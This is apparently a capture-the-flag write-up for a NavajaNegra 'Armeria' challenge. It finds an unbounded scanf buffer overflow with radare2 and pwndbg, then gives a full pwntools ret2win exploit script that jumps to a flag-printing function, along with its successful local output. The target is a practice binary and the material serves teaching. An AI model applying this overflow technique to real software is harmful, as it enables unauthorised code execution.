---
title: "Armeria"
date: "2025-10-17"
tags: ["NavajaNegra", "ret2win"]
---

In this exercise we get a binary that does the following:

```c
PWN/nn/armeria ❯ ./Armeria                                                                                                                                                            3.13.7  20:38 
╔══════════════════════════════════════════════════════════════╗
║                        ◣ ARMERIA ◢                           ║
║                                                              ║
║    Hasta la herramienta más simple puede volverse mortal     ║
║     en las manos adecuadas. Demuestra tu destreza:           ║
║     salta donde otros temen y haz brillar la hoja negra.     ║
╚══════════════════════════════════════════════════════════════╝

Existen multitud de tipos de armas cuerpo a cuerpo, adivina mi favorita.
hola
No sé ni cuál es esa.
```

It just lets us send some data and gives a message back. Let's look at how it reads that data with `radare2`:

```c
pdg @ main
. . .
sym.imp.__isoc99_scanf(0x4023b1,&stack0xffffffffffffffa8);
. . .

ps @ 0x4023b1
%s
```

As we can see it only gets the format and not the number of bytes to read, so there is a Buffer Overflow. Looking at the functions we can also see there is a win function:

```c
afl
. . .
0x004011e6    1     77 sym.banner
0x00401262    7    169 sym.win # WIN
0x00401130    1      1 sym._dl_relocate_static_pie
. . .
```

Let's take a look to see if it needs arguments or anything special:

```c
pdg @ sym.win

void sym.win(void)

{
    int64_t iVar1;
    uchar *puVar2;
    ulong uStack_120;
    uchar auStack_118 [256];
    int64_t iStack_18;
    int64_t iStack_10;
    
    *(*0x20 + -0x120) = 0x40127c;
    iStack_10 = sym.imp.fopen("/flag.txt",0x40234c);
    if (iStack_10 == 0) {
        *(&stack0xfffffffffffffee8 + -8) = 0x401291;
        sym.imp.perror("flag.txt");
    }
    else {
        *(&stack0xfffffffffffffee8 + -8) = 0x4012b1;
        sym.imp.setvbuf(_reloc.stdout,0,2,0);
        puVar2 = &stack0xfffffffffffffee8;
        while( true ) {
            iVar1 = iStack_10;
            *(puVar2 + -8) = 0x4012f2;
            iStack_18 = sym.imp.fread(&stack0xfffffffffffffee8,1,0x100,iVar1);
            if (iStack_18 == 0) break;
            iVar1 = iStack_18;
            *(puVar2 + -8) = 0x4012d2;
            sym.imp.fwrite(&stack0xfffffffffffffee8,1,iVar1,_reloc.stdout);
            puVar2 = puVar2 + -8 + 8;
        }
        iVar1 = iStack_10;
        *(puVar2 + -8) = 0x401309;
        sym.imp.fclose(iVar1);
    }
    return;
}
```

It just prints the flag, nothing else needed. Let's check whether `PIE` or `Canary` is enabled, which would get in the way of the `ret2win`.

```c
pwndbg> checksec
File:     /home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

Not the case. The last piece we need for the exploit is the offset from our input to RIP. Let's get it with `pwndbg`:

```c
cyclic
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

 RBP  0x616161616161616b ('kaaaaaaa')
 RSP  0x7fffffffd4a8 ◂— 'laaaaaaamaaa' // Aquí
 RIP  0x4013b9 (main+174) ◂— ret 
 
 
pwndbg> cyclic -l laaaaaaa
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88 // Offset
```

> Since we are on x64 and not x32, instead of looking at RIP we have to look at the first 8 bytes of RSP.

Now that we have everything we can write the exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./Armeria_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("ADDR", PORT)

def main():
    io = conn()
    
    offset = 88
    ret = 0x0000000000401016

    payload = flat({
        offset: [
            ret, # En remoto hace falta porque en remoto el stack queda desalineado
            exe.sym["win"]
        ]
    })
    
    io.recvuntil(b"Existen multitud de tipos de armas cuerpo a cuerpo, adivina mi favorita.\n")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                                                                               3.13.7  22:09 
[*] '/home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria': pid 69057
[*] Switching to interactive mode
No sé ni cuál es esa.
Brr Brr Patapím!
[*] Got EOF while reading in interactive
```

It works! Thanks for reading.